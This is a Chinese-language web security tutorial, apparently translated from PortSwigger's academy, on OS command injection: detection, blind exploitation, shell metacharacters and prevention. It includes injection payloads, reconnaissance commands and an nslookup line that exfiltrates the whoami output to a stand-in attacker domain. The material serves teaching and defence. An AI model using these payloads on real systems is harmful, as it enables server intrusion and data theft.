# 操作系统命令注入

## 什么是OS命令注入？

在本节中，我们将解释什么是操作系统命令注入，描述如何检测和利用漏洞，阐述一些针对不同操作系统的有用命令和技术，并总结如何防止操作系统命令注入。

![](../.gitbook/assets/image%20%2815%29.png)

OS命令注入（也称为外壳程序注入）是一个web安全漏洞，它使攻击者可以在运行应用程序的服务器上执行任意操作系统（OS）命令，并且通常会完全破坏该应用程序及其所有数据。 攻击者通常可以利用OS命令注入漏洞来破坏托管基础结构的其他部分，利用信任关系将攻击转移到组织内的其他系统。

{% embed url="https://www.youtube.com/watch?v=8PDDjCW5XWw" %}

## 执行任意命令

考虑一个购物应用程序，该应用程序使用户可以查看特定商店中某商品是否有库存。 该信息可通过如下网址访问：

```text
https://insecure-website.com/stockStatus?productID=381&storeID=29
```

为了提供库存信息，应用程序必须查询各种旧系统。 由于历史原因，该功能是通过使用产品和存储ID作为参数调用shell命令来实现的：

```text
stockreport.pl 381 29
```

此命令输出指定项目的库存状态，并返回给用户。

由于该应用程序无法防御OS命令注入，因此攻击者可以提交以下输入以执行任意命令：

```text
& echo aiwefwlguh &
```

如果此输入是在productID参数中提交的，那么应用程序执行的命令是：

```text
stockreport.pl & echo aiwefwlguh & 29
```

echo命令只是使提供的字符串在输出中回显，并且是测试某些类型的OS命令注入的有用方法。 ＆字符是shell命令分隔符，因此执行的实际上是一个接一个的三个独立命令。 因此，返回给用户的输出为：

```text
Error - productID was not providedaiwefwlguh29: command not found
```

输出的三行表明：

* 原始的stockreport.pl命令在没有预期参数的情况下执行，因此返回了错误消息。
* 执行注入的echo命令，并且在输出中回显提供的字符串。
* 原始参数29作为命令执行，从而导致错误。

通常，将附加命令分隔符＆放置在注入命令之后是很有用的，因为这会将注入命令与注入点后面的内容分开。 这减少了随后发生的事情将阻止注入的命令执行的可能性。

**实验室**[OS命令注入，简单案例](http://portswigger.cn/academy/subpage/allTopics/all-5.html#)

## 有用的命令

当您确定了OS命令注入漏洞后，通常可以执行一些初始命令来获取有关您受到破坏的系统的信息。 以下是在Linux和Windows平台上有用的一些命令的摘要：

| 命令目的 | Linux | Windows |
| :--- | :--- | :--- |
| 当前用户名 | `whoami` | `whoami` |
| 操作系统 | `uname -a` | `ver` |
| 网络配置 | `ifconfig` | `ipconfig /all` |
| 网络连接 | `netstat -an` | `netstat -an` |
| 运行过程 | `ps -ef` | `任务列表` |

## 盲操作系统命令注入漏洞

OS命令注入的许多实例都是盲目的漏洞。 这意味着应用程序不会在其HTTP响应中返回命令的输出。 盲目漏洞仍然可以被利用，但是需要不同的技术。

考虑一个允许用户提交有关该站点的反馈的网站。 用户输入他们的电子邮件地址和反馈消息。 然后，服务器端应用程序会向站点管理员生成一封包含反馈的电子邮件。 为此，它使用提交的详细信息调出邮件程序。 例如：

```text
mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
```

mail命令的输出（如果有）不会在应用程序的响应中返回，因此使用echo有效负载将无效。 在这种情况下，您可以使用多种其他技术来检测和利用漏洞。

### 使用时间延迟检测盲注OS命令注入

您可以使用注入的命令来触发时间延迟，从而允许您根据应用程序响应的时间来确认命令已执行。 ping命令是执行此操作的有效方法，因为它使您可以指定要发送的ICMP数据包的数量，从而指定该命令运行所花费的时间：

```text
& ping -c 10 127.0.0.1 &
```

此命令将导致应用程序ping其环回网络适配器10秒钟。

**实验室**[带有延迟的盲OS命令注入](http://portswigger.cn/academy/subpage/allTopics/all-5.html#detecting-blind-os-command-injection-using-time-delays)

### 通过重定向输出来利用盲OS命令注入

您可以将注入命令的输出重定向到web根目录下的文件中，然后可以使用浏览器进行检索。 例如，如果应用程序从文件系统位置/var/www/static提供静态资源，则可以提交以下输入：

```text
& whoami > /var/www/static/whoami.txt &
```

&gt;字符将whoami命令的输出发送到指定文件。 然后，您可以使用浏览器获取[https://vulnerable-website.com/whoami.txt来检索文件，并查看注入命令的输出。](https://vulnerable-website.com/whoami.txt来检索文件，并查看注入命令的输出。)

使用带外（OAST）技术利用盲OS命令注入

您可以使用注入的命令，通过OAST技术触发与您控制的系统的带外网络交互。 例如：

```text
& nslookup kgji2ohoyw.web-attacker.com &
```

此有效负载使用nslookup命令对指定域进行DNS查找。 攻击者可以监视是否发生了指定的查找，从而检测到命令已成功注入。

带外通道还提供了一种从注入的命令中提取输出的简便方法：

```text
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

这将导致对包含whoami命令结果的攻击者域的DNS查找：

```text
wwwuser.kgji2ohoyw.web-attacker.com
```

**实验室**[带带外数据渗透的盲OS命令注入](http://portswigger.cn/academy/subpage/allTopics/all-5.html#)

## 注入OS命令的方式

可以使用各种shell元字符来执行OS命令注入攻击。

许多字符用作命令分隔符，使命令可以链接在一起。 以下命令分隔符在Windows和基于Unix的系统上均可使用：

* `&`
* `&&`
* `|`
* `||`

以下命令分隔符仅在基于Unix的系统上工作：

* `;`
* Newline \(`0x0a` or `\n`\)

在基于Unix的系统上，您还可以使用反引号或美元字符在原始命令内对注入的命令执行内联执行：

* \`\`\` 注入命令 \`\`\`
* `$(` 注入命令 `)`

请注意，不同的shell元字符具有细微不同的行为，这可能会影响它们是否在某些情况下起作用，以及它们是否允许带内检索命令输出或仅对盲目利用有用。

有时，您控制的输入会出现在原始命令的引号中。 在这种情况下，需要先使用引号终止上下文（使用“或”），然后再使用适当的shell元字符来插入新命令。

## 如何防止OS命令注入攻击

到目前为止，防止OS命令注入漏洞的最有效方法是永远不要从应用程序层代码中调用OS命令。 几乎在每种情况下，都有使用更安全的平台API来实现所需功能的替代方法。

如果认为无法避免使用用户提供的输入来调用OS命令，则必须执行强输入验证。 有效验证的一些示例包括：

* 根据允许值的白名单进行验证。
* 验证输入是否为数字。
* 验证输入仅包含字母数字字符，不包含其他语法或空格。

切勿尝试通过转义shell元字符来清理输入。 实际上，这太容易出错，容易被熟练的攻击者绕开。

